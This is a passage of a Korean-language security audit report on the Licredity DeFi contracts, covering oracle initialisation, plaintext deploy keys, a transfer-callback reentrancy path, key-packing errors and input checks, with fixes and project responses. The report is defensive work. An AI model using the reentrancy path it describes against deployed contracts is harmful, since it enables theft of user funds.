**설명:** `ChainlinkOracle` 생성자에서 컨트랙트는 Uniswap V4 풀의 현재 `sqrtPriceX96`을 사용하여 `currentPriceX96`, `lastPriceX96`, `emaPrice`를 초기화합니다. 풀이 초기화되지 않은 경우(`sqrtPriceX96 == 0`), 모든 가격 변수는 0으로 설정됩니다. 이 상태에서 `update` 함수는 항상 새로운 가격을 `lastPriceX96 ± (lastPriceX96 >> 6)` 범위로 제한(clamp)하며, 이는 `0 ± 0 = 0`으로 평가됩니다. 결과적으로 오라클은 0에 갇혀 나중에 풀이 초기화되더라도 0이 아닌 가격으로 업데이트할 수 없습니다.

**파급력:** 풀이 초기화되기 전에 배포되면 오라클은 영구적으로 제로 가격에 갇히게 됩니다. 이는 오라클이 실제 시장 가격을 반영하지 못하게 하여 모든 종속 가격 책정 및 증거금 로직을 깨뜨립니다. 오라클에 의존하는 사용자 및 프로토콜은 유효하지 않은(0) 가격 데이터를 받아 기능 상실 또는 잘못된 동작을 초래할 수 있습니다.

**권장 완화 방법:** 생성자(및/또는 `update` 함수)에 `sqrtPriceX96 > 0`인 경우에만 초기화가 발생하도록 확인을 추가하십시오. 풀이 초기화되지 않은 경우 배포를 revert하거나 유효한 가격을 사용할 수 있을 때까지 초기화를 연기하십시오. 대안으로 `lastPriceX96 == 0`일 때 클램프 로직을 우회하여 풀이 초기화되면 오라클이 0에서 0이 아닌 가격으로 업데이트할 수 있도록 허용하십시오.

**Licredity:** [PR#16](https://github.com/Licredity/licredity-v1-oracle/pull/16/files)의 커밋 [`6f5fdd7`](https://github.com/Licredity/licredity-v1-oracle/commit/6f5fdd7c2fdffc4e90b80d7b1c967a700bc9936e)에서 수정되었습니다.

**Cyfrin:** 확인됨. `sqrtPrice`가 `0`이 아님을 생성자에서 확인합니다.

### 배포 스크립트가 암호화되지 않은 개인 키 요구

**설명:** 배포 스크립트 [`deploy.sh`](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/deploy.sh#L29-L44)는 개인 키가 `.env` 파일 내에 일반 텍스트로 저장될 것을 요구합니다:

```bash
# 환경 변수 로드
source .env

...

if [ -z "$PRIVATE_KEY" ]; then
    echo "Error: PRIVATE_KEY not set in .env file"
    exit 1
fi
```

개인 키를 일반 텍스트로 저장하는 것은 버전 제어, 잘못 구성된 백업 또는 손상된 개발자 머신을 통한 우발적 노출 가능성을 높이므로 운영 보안 위험을 나타냅니다.

더 안전한 접근 방식은 암호화된 키 저장을 허용하는 Foundry의 [지갑 관리 기능](https://getfoundry.sh/forge/reference/script/)을 사용하는 것입니다. 예를 들어, [`cast`](https://getfoundry.sh/cast/reference/wallet/import/)를 사용하여 개인 키를 로컬 키 저장소로 가져올 수 있습니다:

```bash
cast wallet import deployerKey --interactive
```

그런 다음 배포 중에 이 키를 안전하게 참조할 수 있습니다:

```bash
forge script script/Deploy.s.sol:DeployScript \
    --rpc-url "$RPC_URL" \
    --broadcast \
    --account deployerKey \
    --sender <deployerKey와 연관된 주소> \
    -vvv
```

추가 지침은 Patrick의 [이 설명 비디오](https://www.youtube.com/watch?v=VQe7cIpaE54)를 참조하십시오.

**Licredity:** 인지함. 그러나 모든 코어 / 오라클 / 주변기기에 대한 배포 및 초기화를 조정하기 위해 별도의 레포지토리를 만들 계획이므로 여기서는 수정하지 않을 것입니다. 그때 더 안전한 관행을 구현할 것입니다.

### 외부 호출 전 `stagedFungible` 미정리로 인한 재진입(Reentrancy)

**설명:** [`Licredity::exchangeFungible`](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/Licredity.sol#L217-L222)에서 임시 `stagedFungible` 플래그는 외부 호출 `baseFungible.transfer(recipient, amountOut)` 이후에만 지워집니다. 기본 토큰이 전송 콜백(예: ERC777 유사 훅)을 지원하는 경우, 수신자는 `stagedFungible`이 여전히 설정된 상태에서 재진입할 수 있습니다. 해당 재진입 중에 그들은 준비된(staged) 상태에 의존하는 `depositFungible`을 호출할 수 있으며, 실제로 새로운 토큰 전송을 수행하지 않고도 예금을 기록할 수 있습니다. `_getStagedFungibleAndAmount`가 `msg.value`를 사용하므로 이는 네이티브 자산 경로에는 적용되지 않습니다.

**파급력:** 표준 ERC-20의 경우 문제가 없습니다. 콜백 기능이 있는 토큰이 사용되는 경우 `transfer` 중 재진입으로 인해 다음이 발생할 수 있습니다:
* 오래된 staged 상태를 관찰하거나 재사용
* 수반되는 전송 없이 `depositFungible`을 기록하여 회계 불일치 및 잠재적 가치 손실 발생.

**권장 완화 방법:**
Checks-Effects-Interactions를 따르십시오: `exchangeFungible`에서 외부 호출 전에 임시 staged 상태를 지우십시오:
```diff
    (Fungible fungibleIn, uint256 amountIn) = _getStagedFungibleAndAmount();
    uint256 amountOut;

+   assembly ("memory-safe") {
+       // staged fungible 지우기
+       tstore(stagedFungible.slot, 0)
+   }

    // ...

    assembly ("memory-safe") {
        // staged fungible 지우기
-       tstore(stagedFungible.slot, 0)
```

**Licredity:** [PR#62](https://github.com/Licredity/licredity-v1-core/pull/62/files)의 커밋 [`fb6a049`](https://github.com/Licredity/licredity-v1-core/commit/fb6a04925543aa77b873f0a1bdd86c7a22dba0f1)에서 수정되었습니다.

**Cyfrin:** 확인됨. `stagedFungible`은 이제 외부 호출 전에 지워집니다.

### `Licredity::_calculateLiquidityKey`에서의 잘못된 패킹

**설명.**
컨트랙트는 [`Licredity::_calculateLiquidityKey`](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/Licredity.sol#L880-L885)에서 일반적인 `keccak256(abi.encodePacked(provider, tickLower, tickUpper, salt))` 대신 사용자 정의 비트 조작으로 "유동성 키"(LP가 유동성을 추가한 시점을 추적하는 데 사용되는 ID)를 생성합니다.
```solidity
assembly ("memory-safe") {
    // key = keccak256(abi.encodePacked(provider, tickLower, tickUpper, salt));
    mstore(0x00, or(or(shl(0x06, provider), shl(0x03, tickLower)), tickUpper))
    mstore(0x20, salt)
    key := keccak256(0x06, 0x3a)
}
```

그러나 이는 공급자(provider) 주소의 처음 6바이트를 건너뛰고 틱 값을 표준 ABI 규칙과 다르게 패킹합니다. 실제로 이는 다음을 의미합니다:

* 여기서 얻은 키는 오프체인 도구(또는 다른 컨트랙트)가 동일한 입력에서 일반 ABI 패킹을 사용하여 계산하는 것과 일치하지 않습니다.
* 극히 드문 경우지만, 서로 다른 두 공급자가 동일한 틱+소금(salt)에 대해 동일한 키를 갖게 될 수 있습니다(예: 처음 몇 바이트만 다른 주소들). 따라서 동일한 "개시(onset)" 슬롯을 공유하게 됩니다.

**파급력.**
두 당사자가 키에서 충돌하면, 한 당사자가 공유된 `liquidityOnsets[key]`를 업데이트하여 다른 당사자의 최소 수명 타이머를 효과적으로 재설정하여 유동성을 제거할 수 있는 능력을 잠시 지연시킬 수 있습니다. 직접적인 이익은 없으며, 그러한 충돌을 찾는 것은 비용이 많이 들고, 틱 0 미만의 유동성은 스왑 가드에 의해 이미 억제됩니다.

**개념 증명 (Proof of Concept):** `_calculateLiquidityKey`를 public으로 만들고 이 테스트를 실행하십시오:
```solidity
function test_calculateLiquidityKey() public view {
    address ad = address(0x1234);
    int24 tL = -1;
    int24 tH = 1;
    bytes32 salt = "";
    bytes32 key1 = licredity._calculateLiquidityKey(ad,tL,tH,salt);
    bytes32 key2 = keccak256(abi.encodePacked(ad, tL, tH, salt));
    assertEq(key1, key2);
}
```

**권장 완화 방법:** 시프트에서 46과 24를 사용하여 올바르게 마스킹하고 사용하십시오:
```solidity
assembly ("memory-safe") {
    // key = keccak256(abi.encodePacked(provider, tickLower, tickUpper, salt));
    // 바이트 정렬 시프트 및 마스크.
    let addr := and(provider, 0x000000000000000000000000ffffffffffffffffffffffffffffffffffffffff) // 20B
    let tl   := and(tickLower,  0xFFFFFF) // 3B 2의 보수
    let tu   := and(tickUpper,  0xFFFFFF) // 3B

    // [ 20B addr | 3B tl | 3B tu | (6B zero padding) ] in the 32B word,
    // 따라서 길이 58의 0x06부터의 슬라이스는 정확히 20+3+3 + 32 salt 바이트입니다.
    let word := or(or(shl(48, addr), shl(24, tl)), tu) // 48 bits = 6 bytes, 24 bits = 3 bytes
    mstore(0x00, word)
    mstore(0x20, salt)
    key := keccak256(0x06, 0x3a)
}
```

**Licredity:** [PR#76](https://github.com/Licredity/licredity-v1-core/pull/76/files)의 커밋 [`a5d9846`](https://github.com/Licredity/licredity-v1-core/commit/a5d98462f70a31e070941730b397c060244b3f8f)에서 수정되었습니다.

**Cyfrin:** 확인됨. 틱 비트가 이제 정리되고 오프셋 48과 24가 사용됩니다.

\clearpage
## 정보성 (Informational)

### Chainlink 오라클 업데이트의 잘못된 단락(short-circuit) 로직

**설명:** `ChainlinkOracle::update` 함수는 다음을 확인하여 가격이나 타임스탬프가 변경되지 않은 경우 업데이트를 단락(건너뛰기)하려고 시도합니다:
```solidity
if (sqrtPriceX96 == lastPriceX96 && currentTimeStamp == block.timestamp) {
    return;
}
```
그러나 이 로직은 결함이 있습니다. `sqrtPriceX96`은 Uniswap V4 풀의 제곱근 가격인 반면, `lastPriceX96`은 `(sqrtPriceX96^2) >> 96` (즉, 제곱근이 아닌 실제 가격)으로 계산되기 때문입니다. 결과적으로 `sqrtPriceX96 == lastPriceX96`은 사소한 경우(예: 둘 다 0인 경우)를 제외하고는 거의 참이 되지 않습니다. 즉, 단락은 거의 트리거되지 않으며 함수는 모든 호출에서 불필요한 계산을 수행합니다.

**파급력:** 비효율적인 실행: 업데이트가 필요하지 않은 경우에도 함수가 항상 업데이트 로직을 진행하므로 불필요한 가스 소비가 발생합니다.

**권장 완화 방법:** 단락 조건을 변경하여 `sqrtPriceX96`을 이전 값과 비교(마지막 `sqrtPriceX96` 저장)하거나 올바르게 계산된 가격 값을 비교하십시오:

```solidity
uint256 priceX96 = (uint256(sqrtPriceX96) * uint256(sqrtPriceX96)) >> 96;
if (priceX96 == lastPriceX96 && currentTimeStamp == block.timestamp) {
    return;
}
```

대안으로 `update` 함수에서 단락 로직을 제거하십시오.

**Licredity:** [PR#14](https://github.com/Licredity/licredity-v1-oracle/pull/14/files)의 커밋 [`13e2cb0`](https://github.com/Licredity/licredity-v1-oracle/commit/13e2cb0f7174bf8d51d71f06012bfc6661727840)에서 수정되었습니다.

**Cyfrin:** 확인됨. `sqrtPriceX86`은 이제 비교 전에 계산되어 비교에 사용됩니다.

### 배열 길이 확인 누락

**설명:** `ChainlinkOracle::quoteFungibles` 함수는 인수로 전달된 `fungibles`와 `amounts` 배열의 길이가 같다고 가정합니다. `fungibles.length`를 반복하고 각 인덱스에 대해 `amounts[i]`에 액세스합니다. `amounts.length`가 `fungibles.length`보다 작으면 함수는 범위를 벗어난 메모리를 읽으려 시도하여 revert로 이어집니다. `amounts.length`가 `fungibles.length`보다 크면 `amounts`의 추가 값은 무시됩니다.

**파급력:** `amounts.length < fungibles.length`인 경우 함수는 범위를 벗어난 오류로 revert되어 트랜잭션이 실패합니다. 이로 인해 예기치 않은 revert와 이 함수와 상호 작용하는 사용자 또는 컨트랙트에 대한 서비스 거부가 발생할 수 있습니다. 입력 검증이 부족하면 컨트랙트를 올바르게 사용하기 어렵고 통합자에게 오류가 발생하기 쉽습니다.

**권장 완화 방법:** 함수의 시작 부분에 `fungibles.length == amounts.length`를 보장하는 명시적 확인을 추가하십시오. 길이가 일치하지 않으면 명확한 에러 메시지와 함께 revert하십시오. 예를 들어:

```solidity
require(fungibles.length == amounts.length, "Input length mismatch");
```

**Licredity:** [PR#60](https://github.com/Licredity/licredity-v1-core/pull/60/files)의 커밋 [`a5ba70b`](https://github.com/Licredity/licredity-v1-core/commit/a5ba70b56f987de11694d0414b79319445ea11e8)에서 수정되었습니다.

**Cyfrin:** 확인됨. NatSpec이 업데이트되었습니다.

### 클램프(clamp) 내 유효 범위 확인 누락

**설명:** `FixedPointMath::clamp` 함수는 `x`를 `minValue`와 `maxValue` 사이로 제한(bound)하기 위한 것입니다. 그러나 `minValue > maxValue`인 경우 어셈블리 로직은 먼저 `z = max(x, minValue)` (최소 `minValue`가 됨)를 설정한 다음 `z`를 `maxValue`로 제한(cap)합니다. 즉, 입력 `x`에 관계없이 함수는 항상 `maxValue`를 반환합니다. 경계가 유효하지 않은 경우 revert나 경고가 없으므로 함수는 조용히 `minValue <= maxValue`라고 가정합니다.

**파급력:** 유효하지 않은 경계(`minValue > maxValue`)로 호출되면 함수가 예상대로 작동하지 않고 항상 `maxValue`를 반환합니다. 이는 적절한 클램핑에 의존하는 컨트랙트에서 미묘한 버그나 잘못된 로직으로 이어져 시스템 전체에 예기치 않은 값이 전파될 수 있습니다. 입력 검증이 부족하여 이러한 문제를 감지하고 디버그하기가 더 어렵습니다.

**권장 완화 방법:** 함수의 시작 부분에 `minValue <= maxValue`를 보장하는 명시적 확인을 추가하십시오. 그렇지 않으면 명확한 에러 메시지와 함께 revert하십시오. 예를 들어:

```solidity
require(minValue <= maxValue, "FixedPointMath: minValue > maxValue");
```

이는 함수가 유효한 경계에서만 작동하도록 하고 조용한 오류를 방지합니다.

대안으로, `clamp`가 경계가 올바를 것으로 예상하고 확인을 수행하지 않음을 문서화하십시오.

**Licredity:** [PR#17](https://github.com/Licredity/licredity-v1-oracle/pull/17/files)의 커밋 [`4394467`](https://github.com/Licredity/licredity-v1-oracle/commit/43944676b458a95df19461298b5c3507a7a43055)에서 수정되었습니다.

**Cyfrin:** 확인됨. 가스 절약을 위해 확인은 생략되었지만 미묘한 차이는 natspec에 문서화되었습니다.

### Uniswap 모듈 초기화 시 제로 주소 확인 누락

**설명:** `UniswapV3ModuleLibrary`의 `initialize` 함수는 `poolFactory` 또는 `positionManager`가 제로 주소인지 확인하지 않습니다. `poolFactory`가 `address(0)`으로 설정되면, 재초기화에 대한 유일한 보호가 `require(address(self.poolFactory) == address(0), AlreadyInitialized());`이므로 모듈을 재초기화할 수 있습니다. 이는 공격자나 버그가 모듈 구성을 재설정할 수 있게 하며, 이는 의도된 바가 아닙니다.

마찬가지로 `UniswapV4ModuleLibrary`의 `initialize` 함수는 `poolManager` 또는 `positionManager`가 제로 주소인지 확인하지 않습니다. `poolManager`가 `address(0)`으로 설정되면, 재초기화에 대한 유일한 보호가 `require(address(self.poolManager) == address(0), AlreadyInitialized());`이므로 모듈을 재초기화할 수 있습니다. 이는 공격자나 버그가 모듈 구성을 재설정할 수 있게 하며, 이는 의도된 바가 아닙니다.

**파급력:** `poolFactory`/`poolManager`가 0으로 설정되면 모듈이 새로운 매개변수로 재초기화되어 불변성 보장이 깨질 수 있습니다. 이는 모듈에 대한 통제력 상실, 잘못된 구성 또는 모듈이 악성 컨트랙트를 가리키는 경우 보안 문제로 이어질 수 있습니다. 중요한 주소가 0으로 설정되면 서비스 거부가 발생할 수 있습니다.

**권장 완화 방법:** 초기화 중에 `poolFactory`/`poolManager`나 `positionManager`가 제로 주소가 아님을 보장하는 명시적 확인을 추가하십시오. 예를 들어:

```solidity
require(poolFactory != address(0) && positionManager != address(0), "UniswapV3Module: zero address");
```

그리고

```solidity
require(poolManager != address(0) && positionManager != address(0), "UniswapV4Module: zero address");
```

이는 우발적 또는 악의적인 재초기화를 방지하고 적절한 구성을 강제합니다.

**Licredity:** [PR#15](https://github.com/Licredity/licredity-v1-oracle/pull/15/files)의 커밋 [`21e5396`](https://github.com/Licredity/licredity-v1-oracle/commit/21e539657d20317fa8b874c20884a86fec807130), [`bd56d24`](https://github.com/Licredity/licredity-v1-oracle/commit/bd56d246e2eed497288b82f0281ccf76fe5d4e7d), [`d0845ae`](https://github.com/Licredity/licredity-v1-oracle/commit/d0845aed9451a7d1c7267cb2238f78965094373b)에서 수정되었습니다.

**Cyfrin:** 확인됨. 초기화 함수는 이제 positionManager만 받고, 자신이 이미 초기화되지 않았는지 확인한 다음 이를 사용하여 관련 팩토리 / 풀 관리자를 가져옵니다.

### `recipient`에 대한 제로 주소 확인 누락

**설명:** `Licredity::exchangeFungible`, `Licredity::withdrawFungible`, `Licredity::withdrawNonFungible`, `Licredity::seize` 함수는 `recipient` 주소를 검증하지 않습니다. 예를 들어, 사용자가 `Licredity::withdrawFungible`을 호출하고 `address(0)`을 수신자로 제공하면 함수는 대체 가능 토큰을 제로 주소로 전송합니다. 대부분의 토큰 표준은 제로 주소로의 전송을 소각으로 취급하여 토큰이 영구적이고 회복 불가능하게 손실됨을 의미합니다.

**파급력:** 사용자는 사용자 인터페이스 버그, 스크립팅 오류 또는 단순한 실수로 인해 실수로 제로 주소를 제공할 수 있습니다. 이로 인해 출금한 자산이 돌이킬 수 없이 손실될 수 있습니다. 조치는 사용자가 시작하지만 컨트랙트는 이 흔하고 비용이 많이 드는 오류를 쉽게 방지할 수 있습니다.

**권장 완화 방법:** `withdrawFungible` 함수의 시작 부분에 `require` 문을 추가하여 `recipient` 주소가 제로 주소가 아님을 확인하십시오.

```solidity
// ...existing code...
    /// @inheritdoc ILicredity
    function withdrawFungible(uint256 positionId, address recipient, Fungible fungible, uint256 amount) external {
        require(recipient != address(0), "Cannot withdraw to zero address");
        Position storage position = positions[positionId];

        // require(position.owner == msg.sender, NotPositionOwner());
// ...existing code...
```

**Licredity:** [PR#58](https://github.com/Licredity/licredity-v1-core/pull/58/files)의 커밋 [`d0b6f6d`](https://github.com/Licredity/licredity-v1-core/commit/d0b6f6da165fd48d6aca29f0b4382c2ecc3bbaae)에서 수정되었습니다.

**Cyfrin:** 확인됨. `noZeroAddress` 제어자가 추가되어 위에서 언급한 함수에서 사용됩니다.

### 최소 예금 강제 누락

**설명:** `Licredity::depositFungible` 함수는 최소 예금 규모를 강제하지 않습니다. 이는 사용자가 극히 적고 경제적으로 의미 없는 담보 금액(즉, "먼지(dust)")으로 포지션을 생성하거나 추가할 수 있게 합니다.

**파급력:** 먼지 예금을 허용하면 상태 비대화(state bloat)가 발생할 수 있습니다. 악의적인 행위자는 무시할 수 있는 가치를 가진 많은 포지션을 생성하여 컨트랙트의 스토리지를 어지럽힐 수 있습니다. 또한 이러한 확인이 없으면 컨트랙트의 전반적인 공격 벡터 표면이 증가합니다.

**권장 완화 방법:** `depositFungible` 함수 내에 최소 예금 금액 확인을 도입하십시오. 이는 하드코딩된 상수이거나 구성 가능한 변수일 수 있습니다. 예금 금액이 이 임계값 미만이면 트랜잭션이 revert되어야 합니다.

```diff
// ...existing code...
+    uint256 private constant MIN_DEPOSIT_AMOUNT = 10000; // Example value, should be set appropriately

	 function depositFungible(uint256 positionId) external payable {
        Position storage position = positions[positionId];
        (Fungible fungible, uint256 amount) = _getStagedFungibleAndAmount();

+        require(amount >= MIN_DEPOSIT_AMOUNT, "Deposit amount too small");
		...
    }
// ...existing code...
```

**Licredity:** 인지함. 그러나 1) 문제가 될지 불분명하고 2) 먼지 자산 / 먼지 포지션을 생성하는 다른 방법이 있으며 3) 매직 넘버를 갖지 않는 것을 선호하고 제안된 완화 방법이 실용적이지 않기 때문에(0.001 BTC는 0.001 PEPE와 의미 있게 다름) 수정할 계획이 없습니다.

### `ChainlinkOracle`에서 `governor` 변경 시 2단계 프로세스 사용 고려

**설명:** `ChainlinkOracleConfigs::updateGovernor`는 단일 호출로 `governor`를 전환합니다. 오타나 손상된 서명자는 통제권을 되돌릴 수 없게 넘길 수 있습니다. `Licredity` (`RiskConfig`)에서 수행되는 것처럼 `governor` 변경에 대해 2단계 프로세스를 사용하는 것을 고려하십시오.

**Licredity:** [PR#19](https://github.com/Licredity/licredity-v1-oracle/pull/19/files)의 커밋 [`716cd8d`](https://github.com/Licredity/licredity-v1-oracle/commit/716cd8d269ef4149a8121e25affcc97ef416018a)에서 수정되었습니다.

**Cyfrin:** 확인됨. 2단계 거버너 이양이 이제 사용됩니다.

### `increaseDebtShare` 및 `decreaseDebtShare`에서 제로 델타 확인 누락

**설명:** `Licredity::increaseDebtShare` 및 `Licredity::decreaseDebtShare` 함수는 `delta` 매개변수가 0이 아닌지 검증하지 않습니다. 사용자는 `delta = 0`으로 이러한 함수를 호출할 수 있으며, 결과적으로 `amount`는 0이 됩니다. 함수는 실행을 진행하고 필요한 모든 확인과 상태 읽기를 수행하지만 궁극적으로 포지션의 부채나 총 부채 잔액을 변경하지 않습니다. 그러나 여전히 0 값을 가진 `IncreaseDebtShare` 또는 `DecreaseDebtShare` 이벤트를 방출합니다.

**파급력:**
- **가스 낭비 및 불필요한 작업:** 제로 `delta`로 이러한 함수를 호출하는 것은 아무런 목적이 없지만 여전히 함수 호출 및 내부 작업에 가스를 소비합니다.
- **이벤트 로그 스팸:** 악의적인 행위자가 제로 값 이벤트로 블록체인을 스팸할 수 있게 하여, 오프체인 모니터링 도구 및 인덱서가 의미 있는 데이터를 파싱하기 어렵게 만들 수 있습니다. 이는 낮은 수준의 방해(griefing) 벡터입니다.

**권장 완화 방법:** `increaseDebtShare` 및 `decreaseDebtShare` 모두의 시작 부분에 `delta`가 0보다 커야 한다는 요구 사항을 추가하십시오.

```solidity
// ...existing code...
    function increaseDebtShare(uint256 positionId, uint256 delta, address recipient)
        external
        returns (uint256 amount)
    {
        require(delta > 0, "Delta must be greater than zero");
        Position storage position = positions[positionId];

        // require(position.owner == msg.sender, NotPositionOwner());
// ...existing code...
// ...existing code...
    function decreaseDebtShare(uint256 positionId, uint256 delta, bool useBalance) external returns (uint256 amount) {
        require(delta > 0, "Delta must be greater than zero");
        Position storage position = positions[positionId];

        uint256 _totalDebtShare = totalDebtShare; // gas saving
// ...existing code...
```

**Licredity:** 인지함. 그러나 그대로 둘 것입니다. 생각은 다음과 같습니다: 1) 이 벡터는 공격자에게 가스를 낭비하게 하지만 상태를 변경하지 않으며(이벤트 제외), 2) `open()`과 같은 다른 함수에도 유사한 벡터가 존재하며 쉽게 방지할 수 없고, 3) 이를 수정하면 다른 사람들이 확인을 위해 약간의 추가 가스를 지불하게 될 것입니다.

### EIP-20 전송 함수가 제로 주소를 허용하여 의도치 않은 토큰 소각 유발

**설명:** EIP-20 준수 확인 결과 transfer() 및 transferFrom()이 제로 주소를 수신자로 허용하여 토큰 소각을 트리거하고 예기치 않은 totalSupply 변경을 유발하는 것으로 나타났습니다.

**파급력:** EIP-20 모범 사례.

**개념 증명 (Proof of Concept):** :x:위반됨: https://prover.certora.com/output/52567/a06b3c48627f41239d2cb1f7e0e237f6/?anonymousKey=38b44e833d45c5bf433d65284f2359cca844ae62

```solidity
// EIP20-05: transfer()가 유효하지 않은 조건에서 revert되는지 확인
// EIP-20: "메시지 호출자의 계정 잔액에 지출할 토큰이 충분하지 않으면 함수는 throw해야 한다(SHOULD throw)."
rule eip20_transferMustRevert(env e, address to, uint256 amount) {

    setup(e);

    // 'from' 잔액 스냅샷
    mathint fromBalancePrev = ghostERC20Balances128[_Licredity][e.msg.sender];

    // revert 경로로 전송 시도
    transfer@withrevert(e, to, amount);
    bool reverted = lastReverted;

    assert(e.msg.sender == 0 => reverted,
           "[SAFETY] Transfer from zero address must revert");

    assert(to == 0 => reverted,
           "[SAFETY] Transfer to zero address must revert");

    assert(fromBalancePrev < amount => reverted,
           "[EIP-20] Transfer must revert if sender has insufficient balance");
}
```

**권장 완화 방법:**
```diff
diff --git a/core/src/BaseERC20.sol b/core/src/BaseERC20.sol
index bed3880..5903415 100644
--- a/core/src/BaseERC20.sol
+++ b/core/src/BaseERC20.sol
@@ -56,6 +56,7 @@ abstract contract BaseERC20 is IERC20 {

     /// @inheritdoc IERC20
     function transfer(address to, uint256 amount) public returns (bool) {
+        require(to != address(0)); // @certora fix for eip20_transferMustRevert
         _transfer(msg.sender, to, amount);

         return true;
@@ -63,6 +64,7 @@ abstract contract BaseERC20 is IERC20 {

     /// @inheritdoc IERC20
     function transferFrom(address from, address to, uint256 amount) public returns (bool) {
+        require(to != address(0)); // @certora fix for eip20_transferFromMustRevert
         assembly ("memory-safe") {
             from := and(from, 0xffffffffffffffffffffffffffffffffffffffff)
```

:white_check_mark:통과됨 (수정 후): https://prover.certora.com/output/52567/75d18b94dee042a98d80ba9826a66417/?anonymousKey=b8999a782ea5486f333b616abe65aa0ce09a1767

**Licredity:** [PR#63](https://github.com/Licredity/licredity-v1-core/pull/63/files)의 커밋 [`a15c17f`](https://github.com/Licredity/licredity-v1-core/commit/a15c17f2d871cb8cfa30814c41c43596211617fe)에서 수정되었습니다.

**Cyfrin:** 확인됨, `to`가 `address(0)`이 아닌지 검증됨.

### Governor 설정자 경계 누락

**설명:** `RiskConfigs` 컨트랙트의 governor 함수 `setMinLiquidityLifespan`, `setMinMargin`, `setDebtLimit`은 입력 매개변수에 대해 어떠한 검증도 수행하지 않습니다. 특권 사용자(`governor`)는 이러한 중요한 위험 매개변수를 아무런 제약 없이 임의의 `uint256` 값으로 설정할 수 있습니다.

**파급력:** 이러한 함수는 `onlyGovernor` 제어자로 보호되지만, 입력 검증 부족은 인적 오류나 잘못된 구성의 위험을 초래합니다. 예를 들어:
- `_minLiquidityLifespan`을 극도로 큰 값으로 설정하면 사용자 유동성 포지션을 비합리적인 시간 동안 효과적으로 잠글 수 있습니다.
- `_minMargin` 또는 `_debtLimit`을 지나치게 높거나 낮은 값으로 설정하면 핵심 프로토콜 기능(예: 차입)을 실수로 중단시키거나 프로토콜을 의도하지 않은 수준의 위험에 노출시킬 수 있습니다.
단순한 오타나 단위 실수는 중대한 운영 문제로 이어질 수 있습니다.

**권장 완화 방법:** 우발적인 잘못된 구성에 대한 안전장치 역할을 하도록 이러한 매개변수에 대해 합리적인 온전성 확인(즉, 최소 및 최대 경계)을 도입하십시오. 이는 입력 값을 검증하는 `require` 문을 추가하여 수행할 수 있습니다.

**Licredity:** [PR#68](https://github.com/Licredity/licredity-v1-core/pull/68/files)의 커밋 [`ba92282`](https://github.com/Licredity/licredity-v1-core/commit/ba92282cb3d8c9061927f20aed335de60e116423)에서 수정되었습니다.

`minLiquidityLifespan`에는 7일의 상한이 주어져 유동성이 결국 제거될 수 있도록 보장합니다. `minMargin`과 `debtLimit`은 유연하게 유지하기로 선택했습니다. 이들은 예외적인 상황, 예를 들어 앵커 풀 유동성의 급격하고 과감한 하락 후 새로운 부채 발행을 중지하기 위해 당길 수 있는 레버입니다.

**Cyfrin:** 확인됨. `minLiquidityLifespan`은 7일의 상한을 가집니다.

### `ChainlinkOracle`의 혼란스러운 타임스탬프 명명

**설명:** `ChainlinkOracle`에서 타임스탬프 변수의 이름이 혼란스러운 방식으로 지정되었습니다. `currentTimeStamp`는 실제로 마지막 업데이트 시간을 저장하고, `lastUpdateTimeStamp`는 이전 업데이트 시간을 저장합니다. [`ChainlinkOracle::update`](https://github.com/Licredity/licredity-v1-core/blob/1ec4b09826b4299a572e02accb75e8458385c943/src/ChainlinkOracle.sol#L102-L107)는 `currentTimeStamp = block.timestamp`를 설정하기 전에 `currentTimeStamp → lastUpdateTimeStamp`로 이동시키지만, 이름은 "current"가 "지금"을 의미한다고 제안하는데 그렇지 않습니다:
```solidity
// if timestamp has changed, update cache
if (block.timestamp != currentTimeStamp) {
    lastPriceX96 = currentPriceX96;
    lastUpdateTimeStamp = currentTimeStamp;
    currentTimeStamp = block.timestamp;
}
```
명확성을 위해 이름 변경을 고려하십시오. 예:
* `currentTimeStamp` → `lastUpdateTimestamp`
* `lastUpdateTimeStamp` → `prevUpdateTimestamp`”

**Licredity:** 인지함. 그러나 그대로 두는 것으로 괜찮습니다.

### `NonFungible` 중간 필드의 더티 비트(Dirty bits)로 인한 비교 깨짐 가능성

**설명:** [`NonFungible`](https://github.com/Licredity/licredity-v1-core/blob/e8ae10a7d9f27529e39ca277bf56cef01a807817/src/types/NonFungible.sol#L8-L16)은 `160 bits address | 32 bits empty | 64 bits tokenId` 레이아웃을 가진 `bytes32`로 패킹됩니다. 동등성(Equality)은 원시 `bytes32` 비교로 구현됩니다:
```solidity
/// @dev 160 bits token address | 32 bits empty | 64 bits token ID
type NonFungible is bytes32;

...

function equals(NonFungible self, NonFungible other) pure returns (bool) {
    return NonFungible.unwrap(self) == NonFungible.unwrap(other);
}
```
32비트 중간 세그먼트가 사용되지 않으므로, 거기에 남아 있는 0이 아닌 "더티 비트"는 그렇지 않으면 동일한 `(address, tokenId)` 쌍이 동일하지 않은 것으로 비교되게 만듭니다. 이는 인코딩을 정규화하지 않는 모듈 간의 조회 및 동등성 확인을 깨뜨릴 수 있습니다. 이는 배열/집합에서의 실패한 제거와 같은 진단하기 어려운 문제로 이어질 수 있습니다. 직접적인 악용 경로는 찾지 못했지만, 통합 버그로 나타날 수 있는 잠재적 위험 요소(footgun)입니다.

정규 인코딩 및/또는 정규 동등성 채택을 고려하십시오:

* 가장 쉬운 방법: 전체 워드가 의미를 갖도록 `tokenId`를 96비트로 확장하여 간격을 소비하십시오.

  ```solidity
  // 160 bits addr | 96 bits id
  function pack(address token, uint256 id) pure returns (NonFungible nf) {
      uint256 w = (uint256(uint160(token)) << 96) | (id & ((1 << 96) - 1));
      return NonFungible.wrap(bytes32(w));
  }
  ```
* 또는 64비트 id를 유지하되, pack 시 간격을 0으로 만들고 equals 시 마스킹하십시오:

  ```solidity
  uint256 constant MASK_ADDR  = uint256(type(uint160).max) << 96;
  uint256 constant MASK_ID64  = uint256(type(uint64).max);
  uint256 constant MASK_CANON = MASK_ADDR | MASK_ID64;

  function pack(address token, uint256 id) pure returns (NonFungible nf) {
      uint256 w = (uint256(uint160(token)) << 96) | (id & MASK_ID64); // 간격 0으로 설정
      return NonFungible.wrap(bytes32(w));
  }

  function equals(NonFungible a, NonFungible b) pure returns (bool) {
      return (uint256(NonFungible.unwrap(a)) & MASK_CANON)
           == (uint256(NonFungible.unwrap(b)) & MASK_CANON);
  }
  ```

어느 접근 방식이든 서로 다른 인코더가 동일한 정규 값을 생성하고 동등성이 견고하도록 보장합니다.

